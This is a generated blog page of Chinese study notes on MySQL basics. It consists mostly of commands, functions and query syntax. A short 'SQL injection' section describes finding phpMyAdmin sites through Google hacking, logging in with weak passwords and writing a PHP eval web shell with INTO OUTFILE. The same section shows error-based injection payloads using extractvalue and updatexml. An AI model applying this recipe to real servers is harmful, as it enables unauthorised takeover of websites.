@@ -1,0 +1,618 @@
+<!--
+	作者：Sariay
+	时间：2018-09-25
+	描述：There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!
+-->
+
+
+	<!DOCTYPE html>
+	<html>
+		
+
+<head><meta name="generator" content="Hexo 3.8.0">
+	<title>数据库</title>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="apple-mobile-web-app-title" content="Amaze UI">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+    <meta name="author" content="tr">
+    <meta name="keywords" content="safe">
+    <meta name="description" content="">
+   	<!-- css -->
+	<link rel="stylesheet" href="/css/style.css">
+
+	<!-- favicon -->
+	<link href="/img/favicon.ico" rel="Shortcut Icon" type="image/ico">
+	
+	<!-- font-awesome -->
+	<link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+</head>
+	<body>	
+		<!--Preloader-->
+<div id="preloader">
+	<div id="status">
+		<img alt="PRELOADER" src="/img/logo.png">
+	</div>
+</div>
+<!--Preloader end-->
+
+<!-- header -->
+
+	<header id="header-bg-2">
+
+	
+		<div id="cd-logo"><a href="/"><img src="/img/logo.png" alt="Logo"></a></div>
+	
+	
+	<!-- motto or description -->
+		
+ 		<p class="motto"></p>
+	
+	
+	<!-- current page name or title -->
+	
+		
+		
+			
+			<p class="page-name">当前文章&nbsp;:&nbsp;《数据库》</p>
+			
+		
+	
+	
+	<!-- others: such as change-bg, time... -->
+	<p class="page-name-other">
+		12/23/2018 
+		<style type="text/css">
+	header:after {
+		content: '';
+		position: relative;
+		top: 0;
+		left: 0;
+		height: 100%;
+		width: 100%;
+		background: #222222;
+		opacity: .5;
+		z-index: -1;
+	}
+	
+	.change-header-bg{
+		font-style: normal;
+	}
+	.change-header-bg i{
+		text-align: center;
+		cursor: pointer;
+		pointer-events: bounding-box;
+	}
+	@media(max-width:512px) {
+		.change-header-bg {
+			display: none;
+			visibility: hidden;
+		}
+	}
+	
+</style>
+
+<script type="text/javascript">
+	function changeHeaderBg(){
+		var random_bg = Math.floor(Math.random() * 109 + 1);
+		var bg = 'url(https://XXX-youname-XXX.github.io/Random-img/' + random_bg + '.jpg)';
+		$("#header-bg-2").css("background-image", bg);
+	}
+</script>
+
+<span class="change-header-bg">
+	——&nbsp;<i class="fa fa-camera-retro" onclick="changeHeaderBg()"></i>	
+</span>
+	</p>		
+</header>
+
+<!-- nav -->
+<div id="cd-nav">
+	<a href="#0" title="menu" class="cd-nav-trigger"><span></span></a>
+
+	<nav id="cd-main-nav">
+		<ul>
+			
+      		<li class="fa fa-/">
+           		<a href="/" title="主页">主页</a>	
+      		</li>
+    		
+      		<li class="fa fa-/archives">
+           		<a href="/archives" title="归档">归档</a>	
+      		</li>
+    		
+      		<li class="fa fa-/categories">
+           		<a href="/categories" title="分类">分类</a>	
+      		</li>
+    		
+      		<li class="fa fa-/tags">
+           		<a href="/tags" title="标签">标签</a>	
+      		</li>
+    		
+      		<li class="fa fa-/about">
+           		<a href="/about" title="关于">关于</a>	
+      		</li>
+    		
+      		<li class="fa fa-/gallery">
+           		<a href="/gallery" title="相册">相册</a>	
+      		</li>
+    		
+    		
+        	
+		</ul>
+	</nav>
+</div>
+
+		<!--main-->
+		<main> 
+		<div class="page-container">
+		<!-- content srart -->
+<div class="am-g am-g-fixed blog-fixed blog-content">
+	<div class="am-u-md-8 am-u-sm-12">
+
+		<article class="am-article blog-article-p">
+
+			<div class="am-article-hd">
+				
+
+
+				<h1 class="am-article-title blog-text-center">
+					
+					
+	
+		<a href="/2018/12/23/数据库/" itemprop="url">		
+			数据库		
+		</a>
+	
+
+				</h1>
+
+				<p class="am-article-meta blog-text-center">
+					<span>
+						<i class="fa fa-clock-o"></i> 
+						<a href="/2018/12/23/数据库/" itemprop="url">
+	<time datetime="2018-12-23T08:07:03.000Z" itemprop="datePublished">
+  		2018-12-23
+  </time>
+</a>    
+&nbsp;
+					</span>
+					
+					<span>						
+						
+					</span>
+				</p>
+			</div>
+
+			<div class="am-article-bd">
+				<div class="content" id="post-content">
+					
+						<p>[TOC]</p>
+<h3 id="一-数据库定义"><a href="#一-数据库定义" class="headerlink" title="一.数据库定义"></a>一.数据库定义</h3><p>1.数据库：一个用来存放数据的服务或者平台，要么以结构化（数据库、表、数据）的形式存放，要么以非结构化（key=value）形式存储</p>
+<p>   结构化存储eg：学生库（stu_db）——&gt;学生表（stu_table）——&gt;id、name、number、class</p>
+<p>​                                                                                                                  1       hu           21100      95</p>
+<p>​                                                                                                                  2        xi            21101      95</p>
+<p>   非结构化存储eg：students_1.txt   id=1  name=hu  number21100  class=95</p>
+<p>2.数据库模型：关系型数据库（结构化）：mysql / MSSQL / DB2等等</p>
+<p>​                       非关系型数据库（非结构化）：redis / mongodb / NoSQL等等</p>
+<p>   数据库分类：mysql（轻量级开源数据库，适用于中小型企业，性能较好）</p>
+<p>​                       SQL serve（微软开发、适用于中大型企业、需要微软系统作为支撑、不支持跨平台）</p>
+<p>​                       Oracle（收费、适用于大学企业的需求、支持跨平台、需要的服务器配置高）</p>
+<p>mysql配置环境变量：计算机属性——&gt;高级系统设置——&gt;高级——&gt;环境变量——系统变量，添加路径（E:\phpstudy\MySQL\bin）</p>
+<h3 id="二-登录数据库"><a href="#二-登录数据库" class="headerlink" title="二.登录数据库"></a>二.登录数据库</h3><p>DOS窗口登录mysql：mysql  -uroot  -p密码</p>
+<p>-u表示用户名，-p表示密码（先不输入，后续输入也可以）</p>
+<p>mysql-front  开源的数据库管理器</p>
+<p>phpmyadmin  基于网页的数据库管理器</p>
+<p>mysql默认端口3306</p>
+<p>打开数据库管理器，数据库名——&gt;数据表名——&gt;</p>
+<h3 id="三-mysql基础命令"><a href="#三-mysql基础命令" class="headerlink" title="三.mysql基础命令"></a>三.mysql基础命令</h3><ul>
+<li>mysql  -u用户名  -p密码     ——&gt;登录数据库</li>
+<li>show databases;      ——&gt;查看数据库</li>
+<li>use   数据库名称;   ——&gt;使用数据库</li>
+<li>show tables;   ——&gt;查看当前使用的数据库下的表</li>
+<li>select  *from  news;   ——&gt;从news这张表中查看所有的数据内容 /</li>
+</ul>
+<p>​                  select   查看数据    </p>
+<p>​                 *表示所有的字段</p>
+<p>​                 from  news  从news这张表去获取数据</p>
+<p>mysql  一般情况下不允许外部连接，也就意味着，使用mysql-front、navivat等管理工具是无法连接上的</p>
+<h3 id="四-mysql函数"><a href="#四-mysql函数" class="headerlink" title="四.mysql函数"></a>四.mysql函数</h3><p>修改密码：先使用初始密码登录</p>
+<ul>
+<li><p>select version();     ——&gt;查看版本号</p>
+</li>
+<li><p>select  user();  ——&gt;显示当前用户</p>
+</li>
+<li><p>mid()      ——&gt;用来截取字符串中的一部分 （select mid(‘ichunqiu’,1,3);） 下标从1开始      </p>
+</li>
+<li><p>ord()   ——&gt;用来显示字符的ASCII码</p>
+</li>
+<li><p>concat()   ——&gt;拼接字符串</p>
+</li>
+<li><p>concat_ws()    ——&gt;使用分隔符来拼接字符串 （select concat_ws(‘|’,’d’,’f’,’a’);）</p>
+</li>
+<li><p>group_concat()   ——&gt;和concat类似</p>
+</li>
+<li><p>select   database()  /  schema()   ——&gt;查看当前数据库</p>
+</li>
+<li><p>select   @@hostname;   ——&gt;获取当前计算机名称</p>
+</li>
+<li><p>select   @@tmpdir;   ——&gt;临时目录</p>
+</li>
+<li><p>@@datadir    ——&gt;真正存放数据的地方</p>
+</li>
+<li><p>@@version   ——&gt; 版本</p>
+</li>
+<li><p>@@basedir   ——&gt;数据所在的位置</p>
+<p>​    </p>
+<p>|           函数名            |          含义          |                   说明                    |<br>| :————————-: | :——————–: | :—————————————: |<br>|      select version();      |       查看版本号       |                                           |<br>|   select connection_id();   |       用户连接数       |                                           |<br>|       select  user();       |      显示当前用户      |                                           |<br>|           mid();            |  截取字符串中的一部分  | select mid(‘ichunqiu’,1,3);） 下标从1开始 |<br>|           ord();            | 用来显示字符的ASCII码  |                                           |<br>|          concat();          |       拼接字符串       |                                           |<br>|        concat_ws();         | 使用分隔符来拼接字符串 |    select concat_ws(‘|‘,’d’,’f’,’a’);    |<br>|      group_concat()；       |      和concat类似      |               和concat类似                |<br>| select  database()/scnema() |     查看当前数据库     |                                           |<br>|    select   @@hostname;     |   获取当前计算机名称   |                                           |<br>|     select   @@tmpdir;      |        临时目录        |                                           |<br>|      select  @@datadir      |   真正存放数据的地方   |                                           |<br>|      select  @@version      |          版本          |                                           |<br>|      select  @@basedir      |     数据所在的位置     |                                           |</p>
+</li>
+</ul>
+<h3 id="五-sql语法"><a href="#五-sql语法" class="headerlink" title="五.sql语法"></a>五.sql语法</h3><h4 id="创、删库"><a href="#创、删库" class="headerlink" title="创、删库"></a>创、删库</h4><h5 id="1-创建数据库"><a href="#1-创建数据库" class="headerlink" title="1.创建数据库"></a>1.创建数据库</h5><ul>
+<li>create database ichunqiu </li>
+<li>mysqladmin  -uroot   -p密码 create 数据库名——&gt;交互式命令窗口</li>
+</ul>
+<h5 id="2-删除数据库"><a href="#2-删除数据库" class="headerlink" title="2.删除数据库"></a>2.删除数据库</h5><ul>
+<li>drop  database  数据库名；  ——&gt;交互式窗口</li>
+<li>mysqladmin  -uroot  -p密码  drop  数据库名   ——&gt;DOS命令窗口</li>
+</ul>
+<h5 id="3-选择数据库"><a href="#3-选择数据库" class="headerlink" title="3.选择数据库"></a>3.选择数据库</h5><ul>
+<li>use  数据库名称</li>
+</ul>
+<h4 id="表操作"><a href="#表操作" class="headerlink" title="表操作"></a>表操作</h4><h5 id="1-删除表"><a href="#1-删除表" class="headerlink" title="1.删除表"></a>1.删除表</h5><ul>
+<li>drop table 表名；</li>
+</ul>
+<h5 id="2-修改表名"><a href="#2-修改表名" class="headerlink" title="2.修改表名"></a>2.修改表名</h5><ul>
+<li>alert  table  原表名  rename  to  新表名；</li>
+</ul>
+<h5 id="3-往表中插入数据"><a href="#3-往表中插入数据" class="headerlink" title="3.往表中插入数据"></a>3.往表中插入数据</h5><ul>
+<li><p>insert  into  表名（字段名1，字段名2，……） value  （value1，value2，……..）</p>
+</li>
+<li><p>插入多条数据</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name  (field1, field2,...fieldN)  VALUES  (valueA1,valueA2,...valueAN),(valueB1,valueB2,...valueBN),(valueC1,valueC2,...valueCN)......;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h5 id="4-查询数据"><a href="#4-查询数据" class="headerlink" title="4.查询数据"></a>4.查询数据</h5><ul>
+<li>select 字段名1，字段名2，……，字段名n  from  表名</li>
+<li>select  *  from  表名</li>
+<li>select  username，password  from users where id=1；（单条件）</li>
+<li>select  *  from stu where  number=33000111  and  name=sxn;（多条件）</li>
+<li>select  字段名1，字段名2，……，字段名n   from  表名  limit  0，1；<ul>
+<li>limit  a,b (limit是用来限制读取记录，a是索引，从0开始，b是记录数)</li>
+</ul>
+</li>
+</ul>
+<h5 id="5-更新数据"><a href="#5-更新数据" class="headerlink" title="5.更新数据"></a>5.更新数据</h5><ul>
+<li>update  表名  set   字段名1=新值1</li>
+</ul>
+<h5 id="6-删除数据"><a href="#6-删除数据" class="headerlink" title="6.删除数据"></a>6.删除数据</h5><ul>
+<li>delect  from  表名  <code>条件</code>；</li>
+<li>delect  from  表名；——&gt;删除表中所有数据，慎用！！！！</li>
+</ul>
+<h5 id="7-选择数据的高级用法"><a href="#7-选择数据的高级用法" class="headerlink" title="7.选择数据的高级用法"></a>7.选择数据的高级用法</h5><ul>
+<li>select  insert（被替换的字符串，替换位置的索引，替换的字符长度，替换的字符串——字符串替换</li>
+<li>select  LEFT（“字符串”，截取长度）——向左截取</li>
+<li>select  right  ——向右截取</li>
+<li>select substring() /mid() /substr()  都是三个参数，第一个：被截取的字符串，第二个：开始位置，截取长度</li>
+<li>select sleep(5);——让数据库等待5秒后，返回值是0</li>
+</ul>
+<h4 id="数据操作"><a href="#数据操作" class="headerlink" title="数据操作"></a>数据操作</h4><h5 id="1-like子句"><a href="#1-like子句" class="headerlink" title="1.like子句"></a>1.like子句</h5><p><code>*</code>   表示任意字符   一般用于select * </p>
+<p><code>%</code>   表示任意字符    例如 select * from ning where name like ‘xiao%’;  //查询小花 </p>
+<p><code>?</code>   表示一个字符   例如 select * from ning where name like ‘?s’;  //查询张三</p>
+<p>select  *  from  stu  where  字段名  like  “字符串”；    其中字符串可以使用通配符</p>
+<h5 id="2-union-联合查询"><a href="#2-union-联合查询" class="headerlink" title="2.union   联合查询"></a>2.union   联合查询</h5><ul>
+<li>select  <em>  from  表1  union  select  </em>  from 表2</li>
+<li>注意：表1和表2中字段的个数要保持一致，否则会报错</li>
+</ul>
+<h5 id="3-order-by-条件-根据条件排序"><a href="#3-order-by-条件-根据条件排序" class="headerlink" title="3.order  by  条件   根据条件排序*"></a>3.order  by  条件   根据条件排序<strong>*</strong></h5><ul>
+<li>select  *  from  users  where  city=’beijing ‘  order  by  name;</li>
+<li>ASC  升序或  DESC  降序</li>
+<li>order  by  n,对第n列的数据进行排序，如果n超过数据表的列数就会报错！！！！</li>
+</ul>
+<h5 id="4-group-by"><a href="#4-group-by" class="headerlink" title="4.group  by"></a>4.group  by</h5><p>对结果进行分组，和COUNT,SUM,AVG等函数一起使用</p>
+<p>select  name，COUNT(*) FROM   employee_tbl GROUP BY name;</p>
+<h4 id="增、删、改字段"><a href="#增、删、改字段" class="headerlink" title="增、删、改字段"></a>增、删、改字段</h4><h5 id="1-删除字段-alert"><a href="#1-删除字段-alert" class="headerlink" title="1.删除字段  alert"></a>1.删除字段  alert</h5><p>alert  table  表名  drop  字段名  ；在表中将某个</p>
+<h5 id="2-增加字段"><a href="#2-增加字段" class="headerlink" title="2.增加字段"></a>2.增加字段</h5><p>alert  table  ADD  字段名   字段类型；</p>
+<h5 id="3-改字段"><a href="#3-改字段" class="headerlink" title="3.改字段"></a>3.改字段</h5><p>alert  table  表名  mpdify   字段名  字段类型；</p>
+<h4 id="My-sql-导入数据"><a href="#My-sql-导入数据" class="headerlink" title="My sql 导入数据"></a>My sql 导入数据</h4><p>（1）mysql -uroot  -p密码   &lt;  要导入的数据库数据（runoob.sql）</p>
+<p>注意：中要字段创建数据库</p>
+<p>如果中不会自动创建数据库，需要执行如下的步骤：</p>
+<p>step1：登录数据库mysql  -u用户名   -p密码</p>
+<p>step2：选择数据库  use  数据库名</p>
+<p>step3：source  路径</p>
+<p>（2）mysqllimport  -uroot  -p  –local  database_name  dump.txt </p>
+<h5 id="mysql-导出数据"><a href="#mysql-导出数据" class="headerlink" title="mysql 导出数据"></a>mysql 导出数据</h5><p>select  *  from  news  into  outfile   绝对路径名</p>
+<ul>
+<li>输入：show global variables like ‘%secure_file_priv%’;   会出现三种情况<ul>
+<li>secure_file_priv  为 NULL 时，表示限制mysqld不允许导入或导出。</li>
+<li>secure_file_priv 为 /tmp （路径）时，表示限制mysqld只能在/tmp目录（路径）中执行导入导出，其他目录不能执行。</li>
+<li>secure_file_priv 没有值时，表示不限制mysqld在任意目录的导入导出。</li>
+</ul>
+</li>
+<li>解决办法：<ul>
+<li>永久办法：修改配置文件(/etc/myconf)，加入<code>secure_file_priv=</code></li>
+<li>临时办法：<code>set global secure_file_priv=&#39;&#39;;</code></li>
+</ul>
+</li>
+</ul>
+<h5 id="Mysql-导出数据库"><a href="#Mysql-导出数据库" class="headerlink" title="Mysql  导出数据库"></a>Mysql  导出数据库</h5><p>mysqldump  -uroot  -p密码  数据库名 &gt; 路径 ——在DOS命令下运行</p>
+<p>mysqldump  -uroot  -p密码  数据库名  表名 &gt;导出的文件名</p>
+<h5 id="mysql-注释"><a href="#mysql-注释" class="headerlink" title="mysql  注释"></a>mysql  注释</h5><ul>
+<li><code>#</code>     (%23)注释直到结束  </li>
+<li><code>--</code>    注释本行     </li>
+<li><code>/**/</code>    （内联注释）</li>
+</ul>
+<h5 id="mysql-数据类型"><a href="#mysql-数据类型" class="headerlink" title="mysql  数据类型"></a>mysql  数据类型</h5><ul>
+<li>整型（int）、浮点型（float）</li>
+<li>日期（DATE）YYYY-MM-DD</li>
+<li>TIMESTAMP   时间戳</li>
+<li>char   字符</li>
+<li>varchar  变长字符</li>
+<li>TEXT  文本</li>
+</ul>
+<h4 id="mysql外联"><a href="#mysql外联" class="headerlink" title="mysql外联"></a>mysql外联</h4><p>（1）改表</p>
+<p>​                 登录到数据库中  use mysql;</p>
+<p>​                  update user set host = ‘%’ where user =‘root’ and host=‘localhost’;   </p>
+<p>通过phpmyadmin 来获取服务器权限（getshell）</p>
+<p>（2）授权法</p>
+<h5 id="拓展sql注入"><a href="#拓展sql注入" class="headerlink" title="拓展sql注入"></a>拓展sql注入</h5><p>step1：首先通过Google hacking找到phpmyadmin的网站</p>
+<p>step2：弱口令登录，show global variables like ‘%secure_file_priv%’;判断我们有没有权限去写木马文件</p>
+<p>step3：select ‘&lt;?php eval($<em>POST[</em>]);?&gt; ‘ into outfile ‘G://re2.txt’;注意：写木马的路径，一般是WWW/var/www/html</p>
+<h5 id="报错函数"><a href="#报错函数" class="headerlink" title="报错函数"></a>报错函数</h5><ul>
+<li><p>extractvalue(XML_document，XPath_string):</p>
+<pre><code>    第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 
+第二个参数：XPath_string (Xpath格式的字符串)
+作用：从目标XML中返回包含所查询值的字符串
+</code></pre><p>eg：  select * from user where user=’root’ and extractvalue(1,concat(0x7e,(select user()),0x7e));</p>
+</li>
+<li><p>UPDATEXML (XML_document, XPath_string, new_value); </p>
+<pre><code>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 
+第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 
+第三个参数：new_value，String格式，替换查找到的符合条件的数据 
+作用：改变文档中符合条件的节点的值
+</code></pre><p>  select * from user where  user=’root’  and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</p>
+</li>
+</ul>
+<h3 id="php连接数据库"><a href="#php连接数据库" class="headerlink" title="php连接数据库"></a>php连接数据库</h3><h5 id="1-使用mysqli去连接"><a href="#1-使用mysqli去连接" class="headerlink" title="1.使用mysqli去连接"></a>1.使用mysqli去连接</h5><p>step1：mysqli_connect(‘’IP”,”name’’,”passwd”)</p>
+<h5 id="2-使用mysql扩展（PHP版本-lt-5-5）"><a href="#2-使用mysql扩展（PHP版本-lt-5-5）" class="headerlink" title="2.使用mysql扩展（PHP版本&lt;=5.5）"></a>2.使用mysql扩展（PHP版本&lt;=5.5）</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$mysql_conf = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'host'</span>    =&gt; <span class="string">'127.0.0.1:3306'</span>, </span><br><span class="line">    <span class="string">'db'</span>      =&gt; <span class="string">'test'</span>, </span><br><span class="line">    <span class="string">'db_user'</span> =&gt; <span class="string">'root'</span>, </span><br><span class="line">    <span class="string">'db_pwd'</span>  =&gt; <span class="string">'root'</span>, </span><br><span class="line">    );</span><br><span class="line">$mysql_conn = @mysql_connect($mysql_conf[<span class="string">'host'</span>], $mysql_conf[<span class="string">'db_user'</span>], $mysql_conf[<span class="string">'db_pwd'</span>]);</span><br><span class="line"><span class="keyword">if</span> (!$mysql_conn) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"could not connect to the database:\n"</span> . mysql_error());<span class="comment">//诊断连接错误</span></span><br><span class="line">&#125;</span><br><span class="line">mysql_query(<span class="string">"set names 'utf8'"</span>);<span class="comment">//编码转化</span></span><br><span class="line">$select_db = mysql_select_db($mysql_conf[<span class="string">'db'</span>]);<span class="comment">//选择数据库</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$select_db) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"could not connect to the db:\n"</span> .  mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">"select * from user;"</span>;</span><br><span class="line">$res = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span> (!$res) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"could get the res:\n"</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ($row = mysql_fetch_assoc($res)) &#123;</span><br><span class="line">    print_r($row);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql_close($mysql_conn);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h5 id="3-使用PDO技术（防止sql注入）"><a href="#3-使用PDO技术（防止sql注入）" class="headerlink" title="3.使用PDO技术（防止sql注入）"></a>3.使用PDO技术（防止sql注入）</h5>
+					
+				</div>
+			</div>
+		</article>
+
+		<ul class="am-pagination">
+    
+	
+		<li class="am-pagination-next">
+		<a class="pull-right" href="/2018/12/06/宁宝宝/" title="宁宝宝">
+			下一篇 &raquo;
+		</a>
+		</li>
+	 
+ </ul>
+        
+
+		<div class="theme-annie-comment-button-container">
+	<button id="annie-comment-button" class="theme-annie-comment-button" onclick="Annie_Comment()">
+		加载评论
+		<!--加载评论-->
+	</button>
+</div>
+
+<div id="annie-comment-container" class="theme-annie-comment-main-container">
+
+	
+		
+			<!-- comment valine -->
+			<!-- show valine comment -->
+<div id="valineComment" class="comment"></div>
+
+<!-- valine`s js & css -->
+<script>
+	window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')
+</script>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="/js/valine.min.js"></script>
+<link rel="stylesheet" href="/css/comment.css">
+
+<script>
+	var checkExistComment = setInterval(function() {
+		if( $('#valineComment').length ) {
+			new Valine({
+				// AV 对象来自上面引入av-min.js(老司机们不要开车➳♡゛扎心了老铁)
+				av: AV,
+				//使用id寻找div元素（使用class可能找不到）
+				el: '#valineComment',
+				emoticon_url: 'https://cloud.panjunwen.com/alu',
+				emoticon_list: ["吐.png", "期待.png", "高兴.png", "吐血倒地.png", "哭泣.png", "欢呼.png"],
+				app_id: "3333....", //获取APP ID
+				app_key: "3333......", //获取APP KEY
+				placeholder: "no any!", //评论框占位提示文字        			
+			});
+			clearInterval(checkExistComment);
+		}
+	}, 100);
+</script>
+		
+	
+
+</div>
+
+<script type="text/javascript">
+	/* Show Comment */
+	var Annie_Comment = function() {
+		function Show_Hidden(obj) {
+			obj.style.display = 'block';
+		}
+		
+		//var obutton = $('#annie-comment-button');
+		//var obutton = $('#annie-comment-container');
+		var obutton = document.getElementById("annie-comment-button" || "0");
+		var odiv = document.getElementById("annie-comment-container");
+		if( 'obutton' ) {
+			obutton.onclick = function() {
+				Show_Hidden(odiv);
+				$("#annie-comment-button").css("display", 'none');
+				return false;
+			}
+		}
+	};
+
+	(function Annie_Init() {
+		Annie_Comment();
+	})();
+</script>
+		
+		<!--
+	时间：2018-09-24
+	描述：The TOC module refers to 'https://github.com/codefine/hexo-theme-mellow', include toc.ejs、toc.js、toc.css. All rights reserved by codefine. 
+-->
+
+	
+		<aside class="post-widget">
+			<nav class="post-toc-wrap" id="post-toc">
+				
+					<strong>文章目录</strong>
+				
+				
+				<!--toc(post.content)-->
+				<ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#一-数据库定义"><span class="post-toc-text">一.数据库定义</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#二-登录数据库"><span class="post-toc-text">二.登录数据库</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#三-mysql基础命令"><span class="post-toc-text">三.mysql基础命令</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#四-mysql函数"><span class="post-toc-text">四.mysql函数</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#五-sql语法"><span class="post-toc-text">五.sql语法</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#创、删库"><span class="post-toc-text">创、删库</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#1-创建数据库"><span class="post-toc-text">1.创建数据库</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#2-删除数据库"><span class="post-toc-text">2.删除数据库</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#3-选择数据库"><span class="post-toc-text">3.选择数据库</span></a></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#表操作"><span class="post-toc-text">表操作</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#1-删除表"><span class="post-toc-text">1.删除表</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#2-修改表名"><span class="post-toc-text">2.修改表名</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#3-往表中插入数据"><span class="post-toc-text">3.往表中插入数据</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#4-查询数据"><span class="post-toc-text">4.查询数据</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#5-更新数据"><span class="post-toc-text">5.更新数据</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#6-删除数据"><span class="post-toc-text">6.删除数据</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#7-选择数据的高级用法"><span class="post-toc-text">7.选择数据的高级用法</span></a></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#数据操作"><span class="post-toc-text">数据操作</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#1-like子句"><span class="post-toc-text">1.like子句</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#2-union-联合查询"><span class="post-toc-text">2.union   联合查询</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#3-order-by-条件-根据条件排序"><span class="post-toc-text">3.order  by  条件   根据条件排序*</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#4-group-by"><span class="post-toc-text">4.group  by</span></a></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#增、删、改字段"><span class="post-toc-text">增、删、改字段</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#1-删除字段-alert"><span class="post-toc-text">1.删除字段  alert</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#2-增加字段"><span class="post-toc-text">2.增加字段</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#3-改字段"><span class="post-toc-text">3.改字段</span></a></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#My-sql-导入数据"><span class="post-toc-text">My sql 导入数据</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#mysql-导出数据"><span class="post-toc-text">mysql 导出数据</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#Mysql-导出数据库"><span class="post-toc-text">Mysql  导出数据库</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#mysql-注释"><span class="post-toc-text">mysql  注释</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#mysql-数据类型"><span class="post-toc-text">mysql  数据类型</span></a></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#mysql外联"><span class="post-toc-text">mysql外联</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#拓展sql注入"><span class="post-toc-text">拓展sql注入</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#报错函数"><span class="post-toc-text">报错函数</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#php连接数据库"><span class="post-toc-text">php连接数据库</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#1-使用mysqli去连接"><span class="post-toc-text">1.使用mysqli去连接</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#2-使用mysql扩展（PHP版本-lt-5-5）"><span class="post-toc-text">2.使用mysql扩展（PHP版本&lt;=5.5）</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#3-使用PDO技术（防止sql注入）"><span class="post-toc-text">3.使用PDO技术（防止sql注入）</span></a></li></ol></li></ol>
+			</nav>
+			<div class="post-toc-bar"><div>
+		</div></div></aside>
+	
+
+	</div>
+</div>
+		</div>
+		</main>
+		
+		<!--footer-->
+		<footer>
+	<div class="blog-text-center">
+		<div class="theme-annie-social">
+				
+				
+					<a href="http://github.com/" title="Github" target="_blank"><i class="fa fa-github"></i>&nbsp;</a>
+					
